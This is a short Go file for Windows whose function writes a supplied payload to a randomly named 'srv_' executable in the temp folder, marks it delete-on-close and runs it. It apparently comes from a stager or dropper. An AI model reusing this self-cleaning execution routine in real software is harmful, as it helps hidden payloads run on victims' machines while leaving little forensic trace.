//go:build windows

package main

import (
	cryptorand "crypto/rand"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"unsafe"
)

var stageHandle syscall.Handle = syscall.InvalidHandle

func executeInMemory(payload []byte) error {
	dir := os.TempDir()
	var rnd [8]byte
	if _, err := cryptorand.Read(rnd[:]); err != nil {
		return err
	}
	name := fmt.Sprintf("srv_%x.exe", rnd)
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, payload, 0700); err != nil {
		return err
	}

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	createFile := kernel32.NewProc("CreateFileW")
	p, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		os.Remove(path)
		return err
	}
	const (
		genericRead       = 0x80000000
		deleteAccess      = 0x00010000
		shareReadWrite    = 0x00000003
		openExisting      = 3
		flagDeleteOnClose = 0x04000000
	)
	h, _, lastErr := createFile.Call(
		uintptr(unsafe.Pointer(p)),
		uintptr(genericRead|deleteAccess),
		uintptr(shareReadWrite),
		0,
		uintptr(openExisting),
		uintptr(flagDeleteOnClose),
		0)
	if syscall.Handle(h) == syscall.InvalidHandle {
		os.Remove(path)
		return fmt.Errorf("CreateFileW(%s): %v", path, lastErr)
	}
	stageHandle = syscall.Handle(h)

	cmd := exec.Command(path)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Start()
}